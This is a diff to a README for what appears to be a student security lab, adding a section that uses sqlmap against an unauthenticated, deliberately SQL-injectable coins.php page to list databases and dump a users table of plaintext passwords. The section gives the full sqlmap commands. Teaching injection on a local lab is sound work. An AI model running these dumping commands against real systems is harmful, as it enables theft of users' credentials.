@@ -1,12 +1,42 @@
 # Using sqlmap
 
 `sqlmap` automates finding and exploiting SQL injection. Here it runs in its own
-container, so **nothing is installed on your host**. It attacks the vulnerable
-`q` parameter of `search.php` and dumps the database — including the plaintext
-passwords.
+container, so **nothing is installed on your host**. It attacks a vulnerable `q`
+parameter and dumps the database — including the plaintext passwords.
 
 > ⚠️ Only ever run this against **this lab app on your own machine**. Using
 > sqlmap on systems you don't own is illegal.
+
+---
+
+## Easiest path — the unauthenticated endpoint (`coins.php`)
+
+`coins.php` is a public coin-price lookup with **no login required** and the same
+SQLi flaw. Use it and you can skip the whole "get a session cookie" dance below —
+just point sqlmap straight at it:
+
+```bash
+cd /Users/tanvir/projects/bubt/cybersecurity
+docker compose up --build -d      # start web + db
+
+# confirm injection + list databases (NO cookie needed)
+docker compose run --rm sqlmap \
+  -u "http://web/crypto-tracker/coins.php?q=BTC" \
+  --output-dir=/output --batch --dbs
+
+# dump the users table straight away (the money shot)
+docker compose run --rm sqlmap \
+  -u "http://web/crypto-tracker/coins.php?q=BTC" \
+  --output-dir=/output --batch --dump -T users -D crypto_tracker
+```
+
+The injection runs on the same DB connection as the rest of the app, so even
+though `coins.php` only *shows* the coins table, sqlmap can read **every** table —
+including `users` with the plaintext passwords.
+
+The rest of this guide targets `search.php`, which requires a login (Step 1) —
+keep it for demonstrating that authenticated endpoints are injectable too, but
+`coins.php` above is the quickest way to dump the DB.
 
 ---
 
